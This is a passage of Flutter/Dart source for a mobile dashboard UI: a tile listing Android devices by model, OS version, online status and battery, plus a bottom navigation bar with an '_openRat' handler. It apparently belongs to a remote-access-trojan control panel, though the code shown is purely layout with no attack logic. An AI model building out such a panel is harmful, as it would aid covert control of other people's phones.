                size: 19,
              ),
            ),
            const SizedBox(width: 11),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    device['model']?.toString() ?? 'Unknown Device',
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                    style: const TextStyle(
                      color: _D.text,
                      fontFamily: 'ShareTechMono',
                      fontSize: 12,
                    ),
                  ),
                  const SizedBox(height: 3),
                  Text(
                    device['release'] != null
                        ? 'Android ${device['release']}'
                        : 'Android OS',
                    style: const TextStyle(
                      color: _D.muted,
                      fontSize: 9,
                    ),
                  ),
                ],
              ),
            ),
            Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: [
                Text(
                  active ? 'ONLINE' : 'OFFLINE',
                  style: TextStyle(
                    color: color,
                    fontFamily: 'ShareTechMono',
                    fontSize: 9,
                  ),
                ),
                const SizedBox(height: 4),
                Text(
                  '${device['battery'] ?? 0}%',
                  style: const TextStyle(
                    color: _D.muted,
                    fontFamily: 'ShareTechMono',
                    fontSize: 9,
                  ),
                ),
              ],
            ),
            const SizedBox(width: 8),
            const Icon(
              Icons.chevron_right_rounded,
              color: Colors.white24,
              size: 19,
            ),
          ],
        ),
      ),
    );
  }

  Widget _smallAction(IconData icon, VoidCallback onTap) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(14),
        child: Container(
          width: 46,
          height: 46,
          decoration: BoxDecoration(
            color: Colors.black.withOpacity(0.55),
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: Colors.white12),
          ),
          child: Icon(icon, color: _D.muted, size: 18),
        ),
      ),
    );
  }

  Widget _buildBottomNav() {
    return Container(
      height: 62,
      padding: const EdgeInsets.symmetric(horizontal: 8),
      decoration: BoxDecoration(
        color: const Color(0xFF1B1B1D).withOpacity(0.94),
        borderRadius: BorderRadius.circular(34),
        border: Border.all(color: Colors.white.withOpacity(0.18)),
        boxShadow: [
          BoxShadow(
            color: Colors.black.withOpacity(0.45),
            blurRadius: 20,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: Row(
        mainAxisAlignment: MainAxisAlignment.spaceAround,
        children: [
          _navItem(Icons.grid_view_rounded, 'Dash', () {
            _scrollController.animateTo(
              0,
              duration: const Duration(milliseconds: 450),
              curve: Curves.easeOut,
            );
          }, active: true),
          _navItem(Icons.chat_bubble_outline_rounded, '', _openSender),
          _navItem(Icons.notifications_none_rounded, '', _showNotification),
          _navItem(Icons.grid_4x4_rounded, '', _openRat),
          _navItem(Icons.explore_outlined, '', _openTools),
        ],
      ),
    );
  }

  Widget _navItem(
    IconData icon,
    String label,
    VoidCallback onTap, {
    bool active = false,
  }) {
    return Expanded(
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(26),
        child: Container(
          height: 48,
          decoration: active
              ? BoxDecoration(
                  color: Colors.white.withOpacity(0.11),
                  borderRadius: BorderRadius.circular(25),
                  border: Border.all(color: Colors.white12),
                )
              : null,
          child: Row(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(icon, color: _D.text, size: 20),
              if (label.isNotEmpty) ...[
                const SizedBox(width: 6),
                Text(
                  label,
                  style: const TextStyle(
                    color: _D.text,
                    fontFamily: 'MADEEvolveSansEVO',
                    fontSize: 11,
                  ),
                ),
              ],
            ],
          ),
        ),
      ),
    );
  }
}

class _MenuItem {
  final String label;
  final Object icon;
  final Color color;
  final VoidCallback onTap;

  const _MenuItem(this.label, this.icon, this.color, this.onTap);
}

class _SparklinePainter extends CustomPainter {
  @override
  void paint(Canvas canvas, Size size) {
    final paint = Paint()
      ..color = _D.green
      ..strokeWidth = 1.8
      ..style = PaintingStyle.stroke
      ..strokeCap = StrokeCap.round;

    final path = Path()
      ..moveTo(2, size.height * 0.72)
      ..lineTo(size.width * 0.18, size.height * 0.62)
      ..lineTo(size.width * 0.34, size.height * 0.68)
      ..lineTo(size.width * 0.51, size.height * 0.42)
      ..lineTo(size.width * 0.67, size.height * 0.49)
      ..lineTo(size.width * 0.86, size.height * 0.20)
      ..lineTo(size.width - 2, size.height * 0.10);

    canvas.drawPath(path, paint);
  }

  @override
  bool shouldRepaint(covariant CustomPainter oldDelegate) => false;
}
